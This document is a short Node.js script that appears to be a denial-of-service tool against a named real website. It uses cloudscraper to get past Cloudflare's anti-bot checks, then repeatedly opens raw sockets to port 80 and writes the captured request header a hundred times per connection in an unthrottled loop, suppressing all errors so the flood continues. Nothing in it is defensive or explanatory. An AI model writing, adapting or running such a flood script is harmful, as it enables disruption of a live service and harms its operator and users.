const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY); 
const cloudscraper = require("cloudscraper");
var int = setInterval(()=>{
var config = {url:"https://www.ssl.com",resolveWithFullResponse: true}
cloudscraper.get(config,(err,r)=>{
console.log(r['request']['req']['_header'])
const s = require("net").Socket()
s.connect(80,"www.ssl.com")
s.setTimeout(10000);
for(let i=0;i<100;i++){
s.write(r['request']['req']['_header'])
}
s.on('data',()=>{
setTimeout(()=>{
s.destroy()
return delete s
})
})







})




setTimeout(()=>clearInterval(int),10000)
})
process.on('uncaughtException', function (err) {
	console.log(err);
});

process.on('unhandledRejection', function (err) {
	console.log(err);
});
